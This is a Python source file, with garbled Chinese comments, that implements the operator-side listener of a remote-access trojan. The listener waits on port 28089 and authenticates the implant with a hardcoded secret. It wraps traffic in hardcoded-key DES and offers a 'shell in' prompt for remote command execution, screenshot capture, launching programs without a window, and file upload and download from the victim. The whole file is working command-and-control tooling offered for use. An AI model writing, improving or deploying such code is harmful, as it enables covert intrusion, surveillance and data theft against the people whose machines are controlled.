#-*- coding : gbk -*-
# coding: gbk
import socket
import time
from os import stat
from os.path import exists
from pyDes import des

use='''
5�ֹ���
tkphoto-�����ͼ           ʹ�÷�����tkphoto ��ͼ���֣������Ƽ��ɣ� �����ַ(���ļ����ľ���·�������·��)                                ����tkphoto test.jpg D:\\test.jpg
nrcv-�޷����н���������      ʹ�÷�����nrcv ִ�е�����                                                                            ����nrcv natepad.exe
fput-�ϴ��ļ�              ʹ�÷�����fput �����ļ���ַ�����ļ����ľ���·�������·���� �ϴ��ĵ�ַ(���ļ����ľ���·�������·��)                ����fput D:\\test.exe C:\\test.exe
fget-�����ļ�              ʹ�÷���:fget Զ���ļ���ַ ���ر����ַ                                                                 ����fget C:\Windows\win.ini E:\win.ini
���������ֱ�ӽ������룬dir��whoami��ipconfig��
ע�����������͡�'''
print(use)
#�ӽ���
def encrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")  # self.key��bytes������16�ı������ɣ� self.iv������16λ
    length = 16
    count = len(text)
    if (count % length != 0):
        add = length - (count % length)
    else:
        add = 0
    text = text + ("\0".encode() * add)  # �����"\0"��������bytes����Ȼ�޷���textƴ��
    ciphertext = cryptor.encrypt(text)
    return ciphertext

def decrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")
    plain_text = cryptor.decrypt(text).decode('gbk')
    return plain_text.rstrip("\0")  #�еĲ���������䣬��ʵdecode����֮��"\0"�Զ���û����


#���ļ�
def putfile(filepath):
    try:
        # ���嶨���ļ���Ϣ��128s��ʾ�ļ���Ϊ128bytes����l��ʾһ��int��log�ļ����ͣ��ڴ�Ϊ�ļ���С
        # �����ļ�ͷ��Ϣ�������ļ������ļ���С
        # �������ļ��Զ����Ƶ���ʽ�ֶ���ϴ���������
        if exists(filepath):
            size = stat(filepath).st_size
            conn.sendall(encrypt(str(size).encode("gbk")))
            time.sleep(1)
            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    print('{0} file send over...'.format(ldata[1]))
                    break
                conn.send(data)
            fp.close()
            return 1
        else:
            print("�ļ������ڣ�")
            return 0
    except Exception as e:
        print(e)
        return 0
#���ļ�
#���ļ�����
def sputfile(filepath):
    try:
        # ���嶨���ļ���Ϣ��128s��ʾ�ļ���Ϊ128bytes����l��ʾһ��int��log�ļ����ͣ��ڴ�Ϊ�ļ���С
        # �����ļ�ͷ��Ϣ�������ļ������ļ���С
        # �������ļ��Զ����Ƶ���ʽ�ֶ���ϴ���������
        if exists(filepath):
            conn.sendall(encrypt("Yes".encode('gbk')))
            if decrypt(conn.recv(1024)) == "ok":
                fp = open(filepath, 'rb')
                data=fp.read()
                # while 1:
                #     data = fp.read(1024)
                #     if not data:
                #         # print('{0} file send over...'.format(ldata[1]))
                #         break
                conn.send(encrypt(data))
                fp.close()
                print("It is ok!")
                return 1
            else:
                print("something is wrong!")
                return 0
        else:
            print("�ļ������ڣ�")
            return 0
    except Exception as e:
        print(e)
        return 0
#���ļ�
def getfile(filepath):
    try:
        # �洢�ڸýű�����Ŀ¼����
        filesize = decrypt(conn.recv(1024))
        if filesize=="No":
            print("�ļ������ڣ�")
        else:
            recvd_size = 0  # �����ѽ����ļ��Ĵ�С
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # �������δ���Ķ�����������д�뵽�ļ�
            while not recvd_size == int(filesize):
                if int(filesize) - recvd_size > 1024:
                    data = conn.recv(1024)
                    recvd_size += len(data)
                else:
                    data = conn.recv(int(filesize) - recvd_size)
                    recvd_size = int(filesize)
                fp.write(data)
            fp.close()
            print("It is ok!")
    except  Exception as e:
        print(e)
#���ļ�����
def sgetfile(filepath):
    try:
        # �洢�ڸýű�����Ŀ¼����
        filexists  = decrypt(conn.recv(1024))
        if filexists=="No":
            print("�ļ������ڣ�")
        else:
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # �������δ���Ķ�����������д�뵽�ļ�
            data=decrypt(conn.recv(1024000))
            fp.write(data.encode('gbk'))
            fp.close()
            print("It is ok!")
            return 1
    except  Exception as e:
        print(e)
        return 0

def listsize(m):
    if m==3:
        return 1
    elif m==4:
        return 1
    else:
        return 0

while True:
    address_server = ('0.0.0.0', 28089)
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(address_server)
    sock.listen()
    print("�ȴ�����....")
    conn,address = sock.accept()
    ret = conn.recv(1024)
    ret=decrypt(ret)
    if ret=="kj#$!#@&*DZF555":
        print("���ջ����ɹ���")
        ret = decrypt(conn.recv(1024))
        print("RHostname:", ret)
        while True:
            yed=input('shell in:')
            ldata = list(yed.split())
            if yed=="":
                print("shell in:")
            else:
                #���ͼ
                if ldata[0]=="tkphoto" and len(ldata)==3:
                    conn.sendall(encrypt(yed.encode('gbk')))
                    getfile(ldata[2])
                    continue
                #���������ͻ����ļ�
                elif ldata[0] == "fget" and listsize(len(ldata)):
                    if ldata[1] == "-s" and len(ldata)==4:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        sgetfile(ldata[3])
                        continue
                    elif len(ldata)==3:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        getfile(ldata[2])
                        continue
                    else:
                        continue
                # ����˴���ͻ����ļ�
                elif ldata[0] == "fput" and listsize(len(ldata)):
                    conn.sendall(encrypt(yed.encode('gbk')))
                    if ldata[1]=="-s" and len(ldata)==4:
                        if sputfile(ldata[2]):
                            continue
                        else:
                            conn.sendall(encrypt("No".encode('gbk')))
                            continue
                    elif len(ldata)==3:
                        if putfile(ldata[1]):
                            continue
                        else:
                            conn.sendall(encrypt("No".encode('gbk')))
                            continue
                    else:
                        continue
                #��������ִ������
                else:
                    if 'quit' == yed:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        break
                    else:
                        conn.sendall(encrypt(yed.encode('gbk')))
                        ret = decrypt(conn.recv(10240000))
                        print('shell out:\n', ret)
    else:
        continue
    conn.close()
    break

